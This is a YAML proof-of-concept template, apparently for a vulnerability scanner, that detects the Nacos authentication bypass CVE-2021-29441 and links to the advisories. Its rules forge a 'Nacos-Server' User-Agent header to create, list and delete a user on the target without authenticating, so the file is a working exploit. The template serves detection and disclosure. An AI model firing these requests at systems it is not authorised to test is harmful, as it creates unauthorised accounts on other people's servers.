name: yaml-poc-alibaba-nacos-other-CVE-2021-29441
binding: bd17f984-1875-49f5-a7d9-b713e018c40a
detail:
    author: haiqing.chen
    links:
        - https://github.com/advisories/GHSA-36hp-jr8h-556f
        - https://github.com/alibaba/nacos/issues/4701
        - https://github.com/alibaba/nacos/pull/4703
        - https://nvd.nist.gov/vuln/detail/CVE-2021-29441
    vulnerability:
        id: 8bd480f1-8cf9-4205-a40e-b40165bc240e
        level: critical
    warning: Harmless
transport: http
set:
    r1: randomLowercase(16)
    r2: randomLowercase(16)
payloads:
    continue: true
    payloads:
        p1:
            nacosPath: |
                "nacos/v1"
        p2:
            nacosPath: |
                "v1"
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /{{nacosPath}}/auth/users/?username={{r1}}&password={{r2}}
            headers:
                User-Agent: Nacos-Server
        expression: response.status == 200 && response.body.bcontains(bytes("create user ok!"))
    r1:
        request:
            cache: true
            method: GET
            path: /{{nacosPath}}/auth/users/?pageNo=1&pageSize=999
            headers:
                User-Agent: Nacos-Server
        expression: response.status == 200 && response.body.bcontains(bytes(r1))
    r2:
        request:
            cache: true
            method: DELETE
            path: /{{nacosPath}}/auth/users/?username={{r1}}
            headers:
                User-Agent: Nacos-Server
        expression: "true"
expression: r0() && r1() && r2()
